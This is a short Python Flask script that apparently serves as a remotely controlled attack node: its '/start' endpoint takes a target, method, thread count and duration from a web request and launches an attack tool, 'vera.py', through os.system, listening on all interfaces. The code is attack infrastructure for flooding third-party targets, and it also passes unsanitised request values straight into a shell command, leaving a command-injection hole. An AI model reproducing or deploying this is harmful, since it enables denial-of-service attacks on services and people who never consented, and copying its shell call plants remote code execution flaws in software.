from flask import Flask, request
import os, threading

app = Flask(__name__)


@app.route('/cheak')
def check():
	return 'valid'


def start(target, method, thread, time):
	os.system(f'python3 vera.py {method} {target} {thread} {time}')


@app.route('/start', methods = ['GET', 'POST'])
def start_attack():
	if request.method == 'GET':
		target = request.args['target']
		method = request.args['method']
		thread = request.args['thread']
		time = request.args['time']

	t = threading.Thread(target = start, args = (target, method, thread, time,))
	t.start()
	return 'start'

app.run(host = '0.0.0.0', port = 8000)